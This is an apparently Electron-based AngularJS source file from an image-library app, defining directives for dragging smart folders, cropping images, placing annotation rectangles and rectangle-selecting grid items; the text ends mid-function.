EagleApp.directive('smartFolderDraggable', function($rootScope) {
    return {
        restrict: 'A',
        //The link function is responsible for registering DOM listeners as well as updating the DOM.
        link: function(scope, element, attrs) {
            var $scope = angular.element("body").scope();
            element.draggable({
                scroll: true,
                scrollSensitivity: 10,
                helper: "clone",
                cursorAt: { top: 5, left: 5 },
                distance: 5,
                // axis: "y",
                revert: false,
                drag: function () {},
                start: function () {
                    $rootScope.currentFocus = '';
                    $scope.$evalAsync();
                },
                stop: function () {
                    $rootScope.currentFocus = 'sidebar';
                    $scope.$evalAsync();
                }
            });
        }
    };
});

EagleApp.directive('smartSortTopDroppable', function($compile) {
    return {
        restrict: 'A',
        link: function(scope, element, attrs) {
            element.droppable({
            	accept: ".smart-folder",
                tolerance: 'pointer',
                hoverClass: "drop",
                greddy: attrs.greddy == "true",
                over: function( event, ui ) {
                    event.stopPropagation();
                },
                drop: function(event, ui) {
                    event.stopPropagation();
                    var $scope = angular.element("body").scope();
                    var draggedScope = angular.element(ui.draggable).scope();
                    var droppedScope = angular.element(this).scope();
                    if (!draggedScope || !droppedScope) return;

                    var draggedFolder = draggedScope && draggedScope.smartFolder;
                    var droppedFolder = droppedScope && droppedScope.smartFolder;
                    var idx = $scope.smartFolders.indexOf(droppedFolder);
                    if (draggedFolder == droppedScope.smartFolder) return;
                    // 放開的資料夾是否為第一層
                    if (idx !== -1) {
                        var dragIdx = $scope.smartFolders.indexOf(draggedFolder);
                        // 第一層拉到第一層
                        if (dragIdx !== -1) {
                            $scope.smartFolders.splice(dragIdx, 1);
                            if (dragIdx > idx) {
                                $scope.smartFolders.splice(idx, 0, draggedFolder);
                            }
                            else {
                                $scope.smartFolders.splice(idx - 1, 0, draggedFolder);
                            }
                        }
                    }
                   
                    $(event.target).removeClass("drop");
                    draggingItem = undefined;
                    $scope.saveFolder();
                    $scope.$evalAsync();
                }
            });
        }
    };
});

EagleApp.directive('smartSortBottomDroppable', function($compile) {
    return {
        restrict: 'A',
        link: function(scope, element, attrs) {
            element.droppable({
            	accept: ".smart-folder",
                tolerance: 'pointer',
                hoverClass: "drop",
                greddy: attrs.greddy == "true",
                over: function( event, ui ) {
                    event.stopPropagation();
                },
                drop: function(event, ui) {
                    event.stopPropagation();
                    var $scope = angular.element("body").scope();
                    var draggedScope = angular.element(ui.draggable).scope();
                    var droppedScope = angular.element(this).scope();
                    if (!draggedScope || !droppedScope) return;

                    var draggedFolder = draggedScope && draggedScope.smartFolder;
                    var droppedFolder = droppedScope && droppedScope.smartFolder;
                    var idx = $scope.smartFolders.indexOf(droppedFolder);
                    if (draggedFolder == droppedScope.smartFolder) return;
                    // 放開的資料夾是否為第一層
                    if (idx !== -1) {
                        var dragIdx = $scope.smartFolders.indexOf(draggedFolder);
                        // 第一層拉到第一層
                        if (dragIdx !== -1) {
                            $scope.smartFolders.splice(dragIdx, 1);
                            if (dragIdx > idx) {
                                $scope.smartFolders.splice(idx +1, 0, draggedFolder);
                            }
                            else {
                                $scope.smartFolders.splice(idx, 0, draggedFolder);
                            }
                        }
                    }
                   
                    $(event.target).removeClass("drop");
                    draggingItem = undefined;
                    $scope.saveFolder();
                    $scope.$evalAsync();
                }
            });
        }
    };
});
EagleApp.directive('cropImage', function ($rootScope, $timeout, $filter) {
    return {
        restrict: 'A',
        link: function($scope, element, attrs) {

            var draggingCropArea = false;
            var cropResizing = false;

            var startX, startY;
            var currentX, currentY;
            var originTop, originLeft;
            var zoomData;

            var $cropContainer = element;
            var $cropArea = element.find(".crop-area");
            var $cropSize = $("#crop-size");
            var containerWidth = $scope.current.width;
            var containerHeight = $scope.current.height;
            var cropAreaWidth = containerWidth;
            var cropAreaHeight = containerHeight;
            var minCropSize = 24;
            var backgroundImage = $bodyScope.getRawUrl($scope.current);

            var $toolbarWidthInput = $("#crop-width");
            var $toolbarHeightInput = $("#crop-height");

            function updateCropperSize () {
                let w = parseInt($toolbarWidthInput.val());
                let h = parseInt($toolbarHeightInput.val());

                if ($cropArea && w > 0 && h > 0) {

                    w = parseInt(Math.min(w, $scope.current.width));
                    h = parseInt(Math.min(h, $scope.current.height));

                    $cropArea.css({
                        width: w,
                        height: h,
                    });

                    showSize();

                    $toolbarWidthInput.val(w);
                    $toolbarHeightInput.val(h);
                }
            }

            $toolbarWidthInput.off("change").on("change", updateCropperSize);
            $toolbarHeightInput.off("change").on("change", updateCropperSize);
            $toolbarWidthInput.off("keyup").on("keyup", function (event) {
                if (event && event.keyCode === 13) {
                    $toolbarHeightInput.focus();
                    $toolbarHeightInput.select();
                }
            });
            $toolbarHeightInput.off("keyup").on("keyup", function (event) {
                if (event && event.keyCode === 13) {
                    $toolbarHeightInput.blur();
                }
            });

            $cropArea.width(containerWidth);
            $cropArea.height(containerHeight);
            $cropArea.css({
                top: 0,
                left: 0,
                width: $scope.current.width,
                height: $scope.current.height,
                // "background-image": `url("${backgroundImage}")`
            });
            $cropArea.addClass("ui-resizable-resizing");
            $cropArea.resizable({
                handles: "n, e, s, w, ne, se, sw, nw",
            });

            $cropSize.html(`x:${0} y:${0}, ${i18n.__('general.w')}:${$scope.current.width} ${i18n.__('general.h')}:${$scope.current.height}`);
            $cropSize.hide();
            $toolbarWidthInput.val($scope.current.width);
            $toolbarHeightInput.val($scope.current.height);


            element.find(".ui-resizable-handle").css({
                "transform": `scale(${100 / $scope.imageSize.zoomRatio})`
            });

            element.css({
                "outline-width": `${Math.max(100 / $scope.imageSize.zoomRatio*1, 1)}px`
            });

            $cropArea.find(".ui-resizable-handle").on("mousedown", function (event) {
                cropResizing = true;
            });

            $scope.$watch("current", function () {
                containerWidth = $scope.current.width;
                containerHeight = $scope.current.height;
                // backgroundImage = $bodyScope.getRawUrl($scope.current);
                $cropArea.css({
                    top: 0,
                    left: 0,
                    width: containerWidth,
                    height: containerHeight,
                    // "background-image": `url("${backgroundImage}")`
                });
            }, true);

            $scope.$watch("imageSize.zoomRatio", function (newValue) {
                element.find(".ui-resizable-handle").css({
                    "transform": `scale(${100 / newValue})`
                });
                element.css({
                    "border-width": `${100 / newValue * 1}px`
                });
            });

            $scope.$on('$destroy', function () {
                cleanup();
            });

            $scope.$on("MOVE-CROP-TOOL", function (event, params) {
                if (!params) return;
                moveCropper(params.horizontal, params.vertical);
            });

            $scope.$on("RESIZE-CROP-TOOL", function (event, params) {
                if (!params) return;
                resizeCropper(params.horizontal, params.vertical);
            });

            function moveCropper (offsetX, offsetY) {
                var width = $cropArea.width();
                var height = $cropArea.height();
                var top = parseInt($cropArea.css("top"));
                var left = parseInt($cropArea.css("left"));
                var windowWidth = containerWidth;
                var windowHeight = containerHeight;
                if (offsetX !== 0) {
                    if (offsetX > 0) {
                        if (left + offsetX + width > windowWidth) {
                            $cropArea.css("left", windowWidth - width);
                        }
                        else {
                            $cropArea.css("left", left + offsetX);
                        }
                    }
                    else if (offsetX < 0) {
                        if (left + offsetX > 0) {
                            $cropArea.css("left", left + offsetX);
                        }
                        else {
                            $cropArea.css("left", 0);
                        }
                    } 
                }
                if (offsetY !== 0) {
                    if (offsetY > 0) {
                        if (top + offsetY + height > windowHeight) {
                            $cropArea.css("top", windowHeight - height);
                        }
                        else {
                            $cropArea.css("top", top + offsetY);
                        }
                    }
                    else if (offsetY < 0) {
                        if (top + offsetY > 0) {
                            $cropArea.css("top", top + offsetY);
                        }
                        else {
                            $cropArea.css("top", 0);
                        }
                    } 
                }
                // $cropArea.css({
                //     backgroundPosition: `${-parseInt($cropArea.css("left"))}px ${-parseInt($cropArea.css("top"))}px`
                // });
                showSize();
            }

            function resizeCropper (offsetX, offsetY) {
                var width = $cropArea.outerWidth();
                var height = $cropArea.outerHeight();
                var top = parseInt($cropArea.css("top"));
                var left = parseInt($cropArea.css("left"));
                var windowWidth = containerWidth;
                var windowHeight = containerHeight;
                if (offsetX !== 0) {
                    if (offsetX > 0) {
                        if (left + offsetX + width > windowWidth) {
                            $cropArea.css("width", windowWidth - left);
                        }
                        else {
                            $cropArea.css("width", width + offsetX);
                        }
                    }
                    else if (offsetX < 0) {
                        if (width > minCropSize) {
                            $cropArea.css("width", width + offsetX);
                        }
                        else {
                            $cropArea.css("width", minCropSize);
                        }
                    } 
                }
                if (offsetY !== 0) {
                    if (offsetY > 0) {
                        if (top + offsetY + height > windowHeight) {
                            $cropArea.css("height", windowHeight - top);
                        }
                        else {
                            $cropArea.css("height", height + offsetY);
                        }
                    }
                    else if (offsetY < 0) {
                        if (height > minCropSize) {
                            $cropArea.css("height", height + offsetY);
                        }
                        else {
                            $cropArea.css("height", minCropSize);
                        }
                    } 
                }
                // $cropArea.css({
                //     backgroundPosition: `${-parseInt($cropArea.css("left"))}px ${-parseInt($cropArea.css("top"))}px`
                // });
                $toolbarWidthInput.val($cropArea.width());
                $toolbarHeightInput.val($cropArea.height());
                showSize();
            }

            var hideSizeTimeout;
            var showSize = function () {
                updateSize()
                $cropSize.show();
                clearTimeout(hideSizeTimeout);
                hideSizeTimeout = setTimeout(function () {
                    $cropSize.hide();
                }, 1000);
            }

            var updateSize = throttle(function () {
                $cropSize.html(`x:${$filter('number', 0)(parseInt($cropArea.css("left")))} y:${$filter('number', 0)(parseInt($cropArea.css("top")))}, ${i18n.__('general.w')}:${$filter('number', 0)($cropArea.width())} ${i18n.__('general.h')}:${$filter('number', 0)($cropArea.height())}`);
                var position = $cropArea[0].getBoundingClientRect();
                $cropSize.css({
                    left: position.x + position.width - 10,
                    top: position.y + position.height,
                    transform: "translateX(-50%)"
                });
            }, 33);

            function cleanup () {
                $cropArea.find(".ui-resizable-handle").off("mousedown");
                $cropArea.off("resizestart");
                $cropArea.off("resize");
                $cropArea.off("resizestop");
                $cropArea.off("mouseup.cropimage");
                $(window).off("mousemove.cropimage");
                $(window).off("mouseup.cropimage");
            }

            var zoomRatio;
            var originalCanvasX;
            var originalCanvasY;
            var orientationY;
            var orientationX;

            $cropArea.on("dblclick", (event) => {
                var $bodyScope = angular.element("body").scope();
                $bodyScope.saveCrop();
            });

            // Resizable
            $cropArea.on("resizestart", function( event, ui ) {
                event.stopPropagation();

                $cropSize.show();

                var zoomData = $("#detail-container").smoothZoom('getZoomData');
                zoomRatio = zoomData.ratio;

                var targetClass = event.originalEvent.target.classList.value;
                $cropSize.removeClass("orientation-ne orientation-se orientation-nw orientation-sw orientation-n orientation-e orientation-s orientation-w");
                if (targetClass.indexOf("ui-resizable-ne") > -1) {
                    $cropSize.addClass("orientation-ne");
                    orientationY = 'n';
                    orientationX = 'e';
                }
                else if (targetClass.indexOf("ui-resizable-se") > -1) {
                    $cropSize.addClass("orientation-se");
                    orientationY = 's';
                    orientationX = 'e';
                }
                else if (targetClass.indexOf("ui-resizable-sw") > -1) {
                    $cropSize.addClass("orientation-sw");
                    orientationY = 's';
                    orientationX = 'w';
                }
                else if (targetClass.indexOf("ui-resizable-nw") > -1) {
                    $cropSize.addClass("orientation-nw");
                    orientationY = 'n';
                    orientationX = 'w';
                }
                else if (targetClass.indexOf("ui-resizable-w") > -1) {
                    $cropSize.addClass("orientation-w");
                    orientationY = '';
                    orientationX = 'w';
                }
                else if (targetClass.indexOf("ui-resizable-e") > -1) {
                    $cropSize.addClass("orientation-e");
                    orientationY = '';
                    orientationX = 'e';
                }
                else if (targetClass.indexOf("ui-resizable-s") > -1) {
                    $cropSize.addClass("orientation-s");
                    orientationY = 's';
                    orientationX = '';
                }
                else if (targetClass.indexOf("ui-resizable-n") > -1) {
                    $cropSize.addClass("orientation-n");
                    orientationY = 'n';
                    orientationX = '';
                }
                else {
                    orientationX = '';
                    orientationY = '';
                }

                // 記錄原來的 x, y 座標
                originalCanvasX = zoomData.scaledX;
                originalCanvasY = zoomData.scaledY;
            } );

            $cropArea.on("resize", function( event, ui ) {

                event.preventDefault();
                event.stopPropagation();

                $cropSize.css({
                    top: `${event.pageY}px`,
                    left: `${event.pageX}px`,
                });

                zoomData = $("#detail-container").smoothZoom('getZoomData');
                var offsetCanvasX = parseInt((originalCanvasX - zoomData.scaledX) / zoomRatio);
                var offsetCanvasY = parseInt((originalCanvasY - zoomData.scaledY) / zoomRatio);
                var dx = ui.position.left - ui.originalPosition.left;
                var dy = ui.position.top - ui.originalPosition.top;
                var left = ui.originalPosition.left + dx / zoomRatio;
                var top = ui.originalPosition.top + dy / zoomRatio;
                var dw = ui.size.width - ui.originalSize.width;
                var dh = ui.size.height - ui.originalSize.height;
                var maxWidth = containerWidth;
                var maxHeight = containerHeight;

                var maxDx = (maxWidth - minCropSize + offsetCanvasX) * zoomRatio;
                var maxDy = (maxHeight - minCropSize + offsetCanvasY) * zoomRatio;
                
                if (dx < 0) {
                    maxWidth = ui.originalPosition.left + ui.originalSize.width;
                }
                // 避免拉出最大值
                else if (dx >= maxDx) {
                    left = ui.originalPosition.left + maxDx / zoomRatio;
                }
                else {
                    maxWidth = containerWidth - ui.originalPosition.left;
                }

                if (dy < 0) {
                    maxHeight = ui.originalPosition.top + ui.originalSize.height;
                }
                // 避免拉出最大值
                else if (dy >= maxDy) {
                    top = ui.originalPosition.top + maxDy / zoomRatio;
                }
                else {
                    maxHeight = containerHeight - ui.originalPosition.top;
                }

                var finalWidth = Math.floor(ui.originalSize.width + dw / zoomRatio);
                var finalHeight = Math.floor(ui.originalSize.height + dh / zoomRatio);

                if (finalWidth <= minCropSize) finalWidth = minCropSize;
                if (finalHeight <= minCropSize) finalHeight = minCropSize;

                if (orientationY === 's') {
                    finalHeight = finalHeight - offsetCanvasY;
                }
                else if (orientationY === 'n') {
                    finalHeight = finalHeight + offsetCanvasY;
                    top = top - offsetCanvasY;
                }
                if (orientationX === 'e') {
                    finalWidth = finalWidth - offsetCanvasX;
                }
                else if (orientationX === 'w') {
                    finalWidth = finalWidth + offsetCanvasX;
                    left = left - offsetCanvasX;
                }

                finalWidth = Math.min(finalWidth, maxWidth);
                finalHeight = Math.min(finalHeight, maxHeight);

                finalWidth = Math.max(finalWidth, minCropSize);
                finalHeight = Math.max(finalHeight, minCropSize);

                ui.size.width = finalWidth;
                ui.size.height = finalHeight;

                ui.position.left = Math.floor(Math.max(left, 0));
                ui.position.top = Math.floor(Math.max(top, 0));
                
                // $cropArea.css({
                //     backgroundPosition: `${-ui.position.left}px ${-ui.position.top}px`
                // });

                $cropSize.html(`x:${$filter('number', 0)(parseInt($cropArea.css("left")))} y:${$filter('number', 0)(parseInt($cropArea.css("top")))}, ${i18n.__('general.w')}:${$filter('number', 0)(finalWidth)} ${i18n.__('general.h')}:${$filter('number', 0)(finalHeight)}`);
                $toolbarWidthInput.val(finalWidth);
                $toolbarHeightInput.val(finalHeight);
            });

            $cropArea.on("resizestop", function(event, ui ) {
                event.stopPropagation();
                cropResizing = false;
                $cropSize.hide();
            });

            // Draggable
            $cropArea.on("mousedown.drag", function (e) {
                e.stopPropagation();
                e.preventDefault();
                if (cropResizing) return;
                draggingCropArea = true;
                zoomData = $("#detail-container").smoothZoom('getZoomData');
                
                var of = $cropArea.position();
                var zoomRatio = zoomData.ratio;

                containerWidth = $cropContainer.width();
                containerHeight = $cropContainer.height();

                cropAreaWidth = $cropArea.width();
                cropAreaHeight = $cropArea.height();

                originTop = of.top / zoomRatio;
                originLeft = of.left / zoomRatio;
                startX = e.pageX;
                startY = e.pageY;

                // 記錄原來的 x, y 座標
                originalCanvasX = zoomData.scaledX;
                originalCanvasY = zoomData.scaledY;

                $cropArea.addClass("ui-resizable-resizing");
            });

            $(window).on("mouseup.cropimage", function (e) {
                if (!draggingCropArea) return;
                e.stopPropagation();
                $cropArea.removeClass("ui-resizable-resizing");    
                draggingCropArea = false;
            });

            $(window).on("mousemove.cropimage", function (e) {

                if (!draggingCropArea) return;

                e.stopPropagation();
                e.preventDefault();

                currentX = e.pageX;
                currentY = e.pageY;
                zoomData = $("#detail-container").smoothZoom('getZoomData');
                zoomRatio = zoomData.ratio;
                
                var offsetX = (startX - currentX) / zoomRatio;
                var offsetY = (startY - currentY) / zoomRatio;
                var offsetCanvasX = parseInt((originalCanvasX - zoomData.scaledX) / zoomRatio);
                var offsetCanvasY = parseInt((originalCanvasY - zoomData.scaledY) / zoomRatio);
                var top = Math.floor(originTop - offsetY - offsetCanvasY);
                var left = Math.floor(originLeft - offsetX - offsetCanvasX);

                // 限制拖拽範圍
                if (top < 0) { top = 0; }
                if (top > containerHeight - cropAreaHeight) { top = containerHeight - cropAreaHeight; }
                if (left < 0) { left = 0; }
                if (left > containerWidth - cropAreaWidth) { left = containerWidth - cropAreaWidth; }

                $cropArea.css({
                    top: `${top}px`,
                    left: `${left}px`,
                    backgroundPosition: `${-left}px ${-top}px`
                });

                showSize();
            });
        }
    }
});

EagleApp.directive('commentItem', function ($rootScope, $timeout) {
    return {
        restrict: 'A',
        link: function($scope, element, attrs) {

            $scope.dragging = false;
            $scope.resizing = false;
            var startX, startY;
            var currentX, currentY;
            var originTop, originLeft;
            var $container = $("[rect-comment]").eq(0);
            var offset = $container.offset();
            var ipcRenderer = require('electron').ipcRenderer;
            var zoomData;

            $(element).resizable();

            $(element).find(".ui-resizable-handle").on("mousedown", function (event) {
                $scope.resizing = true;
            })

            $(element).find(".annotation").on("mousewheel", function (event) {
                event.stopPropagation();
            })

            var zoomRatio;
            $(element).on( "resizestart", function( event, ui ) {
                if (!$bodyScope.isCommentMode) return;
                event.stopPropagation();
                var zoomData = $("#detail-container").smoothZoom('getZoomData');
                zoomRatio = zoomData.ratio;
            } );

            $(element).on( "resize", function( event, ui ) {
                event.preventDefault();
                event.stopPropagation();
                var originWidth = ui.originalSize.width;
                var originHeight = ui.originalSize.height;
                var size = ui.size;
                var offsetWidth = ui.size.width - originWidth;
                var offsetHeight = ui.size.height - originHeight;
                ui.size.width = Math.round(originWidth + offsetWidth / zoomRatio);
                ui.size.height = Math.round(originHeight + offsetHeight / zoomRatio);
            });

            $(element).on("resizestop", function(event, ui ) {
                event.stopPropagation();

                var height = ui.element.height();
                var width = ui.element.width();

                $scope.$evalAsync(function () {
                    $scope.resizing = false;
                    $scope.comment.width = width * $scope.ratio;
                    $scope.comment.height = height * $scope.ratio;
                    ipcRenderer.send('image-change', $scope.current);
                });
            });

            element.on("mousedown.drag", function (e) {
                e.stopPropagation();
                e.preventDefault();
                if ($scope.resizing) return;
                if (!$bodyScope.isCommentMode) return;
                $scope.dragging = true;
                zoomData = $("#detail-container").smoothZoom('getZoomData');
                originTop = $scope.comment.y;
                originLeft = $scope.comment.x;
                startX = e.pageX;
                startY = e.pageY;
            });

            element.on("mouseup.drag", function (e) {
                if (!$scope.dragging) {return;}
                if (!$bodyScope.isCommentMode) return;
                $scope.$evalAsync(function () {
                    e.stopPropagation();
                    $scope.dragging = false;
                    currentX = e.pageX;
                    currentY = e.pageY;
                    var zoomRatio = zoomData.ratio;
                    var offsetX = (startX - currentX) / zoomRatio,
                        offsetY = (startY - currentY) / zoomRatio;
                    element.css({
                        top: (originTop - offsetY) + "px",
                        left: (originLeft - offsetX) + "px"
                    });

                    var newX = (originLeft - offsetX);
                    var newY = (originTop - offsetY);

                    if (newX !== $scope.comment.x || newY !== $scope.comment.y) {
                        $scope.comment.x = newX;
                        $scope.comment.y = newY;
                        ipcRenderer.send('image-change', $scope.current);
                        setTimeout(function () {
                            AnnotationPreview.show();
                        }, 1);
                    }
                    else {
                        AnnotationPreview.focus();
                    }
                });
            });

            $container.on("mousemove.drag", function (e) {

                if (!$scope.dragging) return;
                if (!$bodyScope.isCommentMode) return;

                e.stopPropagation();
                e.preventDefault();

                currentX = e.pageX;
                currentY = e.pageY;

                var zoomRatio = zoomData.ratio;
                var offsetX = (startX - currentX) / zoomRatio,
                    offsetY = (startY - currentY) / zoomRatio;

                var newX = (originLeft - offsetX);
                var newY = (originTop - offsetY);

                if (newX !== $scope.comment.x || newY !== $scope.comment.y) {
                    element.css({
                        top: (newY) + "px",
                        left: (newX) + "px"
                    });
                    $("[contenteditable]:focus").blur();
                    AnnotationPreview.hide();
                }
            });
        }
    }
});

EagleApp.directive('commentsContainer', function ($rootScope, $timeout, $filter) {
    return {
        scope: {
            image: "=image",
            ratio: "=ratio",
        },
        restrict: 'A',
        link: function($scope, element, attrs) {

            var ipcRenderer = require('electron').ipcRenderer;
            element.find(".annotation").blur();

            // $timeout(function () {
            //     $(window).trigger("resize.comments");
            // }, 100);
            var resizeHandler = () => {
                // var $bodyScope = angular.element("body").scope();
                if (!$bodyScope.isDetailMode || !$bodyScope.isCommentMode) return;
                if (!$scope.image) return;
                var $image = $("#detail-image");
                if ($scope.image && $scope.image.width) {
                    $scope.ratio = $scope.image.width / $image.width();
                }
            }

            resizeHandler();
            $(window).on("resize.comments", resizeHandler);

            $scope.$watch("image.id", function () {
                if (!$scope.image) return;
                if (!$scope.image.comments || $scope.image.comments.length === 0) {
                    return;
                }
                var $image = $("#detail-image");
                if ($scope.image && $scope.image.width) {
                    $image.on("load.comment", function () {
                        $scope.ratio = $scope.image.width / $image.width();
                        $scope.$evalAsync();
                        $image.off("load.comment");
                    });
                }
            }, true);

            // $rootScope.commentBlur = function (comment) {
            //     ipcRenderer.send('image-change', $scope.image);
            // }

            $rootScope.removeComment = function (index, comment) {

                var image = $bodyScope.selected[0];
                var originComments = angular.copy(image.comments);

                image.comments.splice(index, 1);
                $rootScope.$broadcast("REBIND_REFRESH", true);
                ipcRenderer.send('image-change', image);

                electronLog && electronLog.info(`[app] Remove image annotation: ${image.name}(${image.id})`);

                var message = $filter('i18n')("notify.annotation.remove");
                // 復原
                $rootScope.notify({
                    message: message,
                    duration: 4000,
                }, function () {
                    image.comments = originComments;
                    $rootScope.$broadcast("REBIND_REFRESH", true);
                    ipcRenderer.send('image-change', image);
                });
                AnnotationPreview.blur();
                AnnotationPreview.hide();
            };

            $("#detail-image").on("click", function () {
                $("#comment-blur").focus();
                setTimeout(function () {
                    $("#comment-blur").blur();
                }, 100);
                // window.getSelection().removeAllRanges();
            });
        }
    }
});

EagleApp.directive('rectComment', function ($rootScope, $timeout) {
    return {
        scope: {
            image: "=image",
            rect: "=rect",
            enabled: "=enabled"
        },
        link: function($scope, element, attrs) {

            var startX, startY;
            var downX, downY;
            var offset = $(element).offset();
            $scope.rect = {},
            $scope.dragging = false;

            element.on("mousedown", ".image-wrap", function (e) {
                e.preventDefault();
                if (!$scope.enabled) return;
                if (e.button !== 0) return;
                if ($scope.$parent.current && $scope.$parent.current.ext == 'mp4' || $scope.$parent.current.ext == 'pdf') {
                    e.preventDefault();
                    e.stopPropagation();
                    return;
                }
                var zoomData = $("#detail-container").smoothZoom('getZoomData');
                var zoomRatio = zoomData.ratio;

                offset = $(element).offset();
                startX = e.pageX;
                startY = e.pageY;
                $scope.rect = {};
                $scope.rect.startX = downX = e.offsetX;
                $scope.rect.startY = downY = e.offsetY + $(element).scrollTop() / zoomRatio;
                $scope.dragging = true;
            });

            element.on("mouseup", function (e) {
                if (!$scope.enabled || !$scope.rect) return;

                AnnotationPreview.hovering = false;
                AnnotationPreview.hide();
                $("#annotation-preview-container-input").focus();
                setTimeout(function () {
                    $("#annotation-preview-container-input").blur();
                }, 50);
                $scope.$evalAsync(function () {
                    if ($("#box-container").length <= 0) return;
                    var offsetLeft = $("#box-container").offset().left - $("#detail-image").offset().left;
                    var offsetTop = $("#box-container").offset().top - $("#detail-image").offset().top;
                    var $image = $("#detail-image").get(0);
                    var ratio = $scope.image.width / $image.clientWidth;
                    var zoomData = $("#detail-container").smoothZoom('getZoomData');
                    var zoomRatio = zoomData.ratio;

                    $scope.dragging = false;

                    // if (offsetLeft > 0) {
                    //     offsetLeft = -20;
                    // }

                    // if (offsetTop > 0) {
                    //     offsetTop = -20;
                    // }

                    var comment = {
                        id: guid(),
                        x: ($scope.rect.startX) * ratio,
                        y: ($scope.rect.startY + $(element).scrollTop()) * ratio,
                        width: $scope.rect.w * ratio,
                        height: $scope.rect.h * ratio,
                        annotation: "",
                        lastModified: Date.now()
                    };

                    if (comment.width > 10 && comment.height > 10) {
                        if (!$scope.image.comments) {
                            $scope.image.comments = [];
                        }
                        $scope.image.comments.push(comment);
                        $rootScope.$broadcast("REBIND_REFRESH", true);
                        $(window).trigger("resize.comments");
                        $timeout(function () {
                            AnnotationPreview.lastElem = $("#comment-" + comment.id)[0];
                            AnnotationPreview.show(true);
                            // $("#comment-" + comment.id).find(".annotation div").get(0).focus();
                        }, 100);
                        electronLog && electronLog.info(`[app] New image annoataion: ${$scope.image.name}(${$scope.image.id})`);
                        analytics.event('Annotation', 'Create');
                    }
                    $scope.rect = undefined;
                });
            });

            element.on("mousemove", function (e) {
                if (!$scope.enabled) return;
                if ($scope.dragging) {
                    var zoomData = $("#detail-container").smoothZoom('getZoomData');
                    var zoomRatio = zoomData.ratio;
                    if (!$scope.rect) return;

                    var flipX = startX > e.pageX,
                        flipY = startY > e.pageY;

                    if (flipX) {
                        $scope.rect.startX = downX - (startX - e.pageX) / zoomRatio;
                    }
                    if (flipY) {
                        $scope.rect.startY = downY - (startY - e.pageY) / zoomRatio;
                    }

                    $scope.rect.w = Math.abs(startX - e.pageX) / zoomRatio;
                    $scope.rect.h = Math.abs(startY - e.pageY) / zoomRatio;

                    $scope.$evalAsync();
                }
            });
        }
    }
});

var rectSelection = {};
var rectSelecting = false;

EagleApp.directive('rectSelect', function($rootScope, $filter) {
    return {
        link: function($scope, element, attrs) {

            rectSelection = {},
            rectSelecting = false;
            var startX, startY;
            var offset = $(element).offset();
            var $rect = $('<div class="rect""></div>').hide();
            var maxHeight;
            var gridItems;
            var originSelected = [];
            var originSelectedMappings = {};
            var isMultipleSelecting;
            var selected = [];
            var windowHeight;
            var $container = $("#box-container");

            $container.prepend($rect);

            element.on("mousedown", function(e) {

                if (e && $container.outerWidth() <= e.offsetX + 10) {
                    e.stopPropagation();
                    return;
                }

                if (e.which != 1 || $scope.isDetailMode) return;
                isMultipleSelecting = e.metaKey || e.ctrlKey;

                offset = $(element).offset();
                gridItems = ig.getItems(true);
                windowHeight = $(window).height();
                // maxHeight = $(".box-list").height();

                if (event.metaKey || event.shiftKey || event.ctrlKey) {

                }
                else {
                    for (var i = 0; i < gridItems.length; i++) {
                        var el = gridItems[i].el;
                        if (!isMultipleSelecting) {
                            if (el) {
                                el.classList.remove("selected");
                            }
                        }
                    }
                    if (!isMultipleSelecting) {
                        $scope.selectedMappings = {};
                    }
                }

                originSelectedMappings = angular.copy($scope.selectedMappings);

                rectSelection.startX = startX = e.pageX - offset.left;
                rectSelection.startY = startY = e.pageY - offset.top + $(element).scrollTop();
                rectSelecting = true;

                if ($("#box-container .rect").length == 0) {
                    $container.prepend($rect);
                }

                $rect.css({
                    transform: "none",
                    top: rectSelection.startY,
                    left: rectSelection.startX,
                });

                $rect.show();
                $rootScope.currentFocus = "content";

            });

            $(window).on("mouseup.rectSelect", function(e) {

                if (!rectSelecting) return;
                if ($scope.isDetailMode) {
                    return;
                }

                rectSelection = {};
                rectSelecting = false;

                $rect.css({
                    top: 0,
                    left: 0,
                    width: 0,
                    height: 0,
                    display: "none",
                    transform: "none"
                });

                $scope.selected = $scope.allData.filter(function (image) {
                    return $scope.selectedMappings[image.id];
                });

                $scope.$evalAsync();
            });

            $(window).on("mousemove.rectSelect", function(e) {

                isMultipleSelecting = e.metaKey || e.ctrlKey;

                if (rectSelecting) {

                    var scrollTop = $(element).scrollTop(),
                        flipX = startX > e.pageX - offset.left,
                        flipY = startY > e.pageY - offset.top + scrollTop;

                    rectSelection.w = Math.abs((e.pageX - offset.left) - startX);
                    rectSelection.h = Math.abs((e.pageY - offset.top) - startY + scrollTop);

                    if (flipX) {
                        rectSelection.startX = startX - rectSelection.w;
                    }
                    if (flipY) {
                        rectSelection.startY = startY - rectSelection.h;
                    }

                    // Note: electron@2.0.2 开始，滑鼠拖拽在窗口边缘不会自动滚动，所以自己处理
                    if (e.pageY <= offset.top + 24) {
                        element.scrollTop(scrollTop - 48);
                    }
                    else if (e.pageY >= windowHeight - 24) {
                        element.scrollTop(scrollTop + 48);
                    }

                    $rect.css({
                        transform: "none",
                        top: rectSelection.startY,
                        left: rectSelection.startX,
                        width: rectSelection.w,
                        height: rectSelection.h,
                    });

                    // gridItems = ig.getItems(true);
                    gridItems = ig.getItems(true);
                    for (var i = 0; i < gridItems.length; i++) {

                        var el = gridItems[i].el;
                        if ( !el || !gridItems[i] ) { continue; };
                        // var id = el.id.replace("box-", "");
                        var id = el.getAttribute("data-box-id");

                        if (!isMultipleSelecting) {
                            if (contain(gridItems[i])) {
                                if (!el.classList.contains("selected")) {
                                    el.classList.add("selected");
                                    $scope.selectedMappings[id] = true;
                                }
                            }
                            else {
                                if (el.classList.contains("selected")) {
                                    el.classList.remove("selected");
                                    delete $scope.selectedMappings[id];
                                }
                            }
                        }
                        else {
                            var isOriginalSelected = originSelectedMappings[id];
                            if (contain(gridItems[i])) {
                                if (isOriginalSelected) {
                                    el.classList.remove("selected");
                                    $scope.selectedMappings[id] = false;
                                }
                                else {
                                    el.classList.add("selected");
                                    $scope.selectedMappings[id] = true;
                                }
                            }
                            else {
                                if (isOriginalSelected) {
                                    el.classList.add("selected");
                                    $scope.selectedMappings[id] = true;
                                }
                                else {
                                    el.classList.remove("selected");
                                    $scope.selectedMappings[id] = false;
                                }
                            }
                        }
                    }
                }
            });

            function contain(gridItem) {
                var offsetX = 16;
                var offsetY = 16;
                var w, h;
                if ($scope.layout === "JustifiedLayout") {
                    w = gridItem.rect.width;
                    h = gridItem.rect.height;
                }
                // NOTE: 瀑布流布局取得的属性不同
                else {
                    w = gridItem.size.width;
                    h = gridItem.size.height;
                }
                var a = {
                        width: w,
                        height: h,
                        x: gridItem.rect.left,
                        y: gridItem.rect.top
                    },
                    b = {
                        width: rectSelection.w,
                        height: rectSelection.h,
                        x: rectSelection.startX,
